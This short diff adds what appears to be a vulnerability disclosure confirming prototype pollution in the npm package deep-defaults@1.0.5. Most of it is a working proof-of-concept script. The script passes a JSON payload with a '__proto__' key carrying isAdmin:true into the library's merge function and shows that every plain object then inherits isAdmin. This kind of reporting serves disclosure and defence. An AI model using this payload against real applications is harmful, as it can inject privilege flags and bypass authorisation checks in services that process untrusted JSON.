@@ -1,0 +1,22 @@
+Confirmed prototype pollution in `deep-defaults@1.0.5`.
+
+```javascript
+// Prototype Pollution in deep-defaults@1.0.5 (lib/index.js)
+// _deepDefaults recurses into dest[k] whenever v is a plain object, without
+// blocking the "__proto__" key. Since dest["__proto__"] resolves to
+// Object.prototype (never undefined), an attacker-controlled source object
+// containing a "__proto__" key lets them recursively merge arbitrary
+// properties onto Object.prototype, polluting every object in the process.
+
+const deepDefaults = require("./node_modules/deep-defaults");
+
+// Simulate attacker-controlled input (e.g. parsed from JSON request body)
+const maliciousInput = JSON.parse('{"__proto__":{"isAdmin":true}}');
+
+// Victim code merging "defaults" into some destination object
+deepDefaults({}, maliciousInput);
+
+// Prototype pollution triggered: every plain object now inherits isAdmin
+const innocentObject = {};
+console.log("isAdmin polluted onto all objects:", innocentObject.isAdmin); // => true
+```
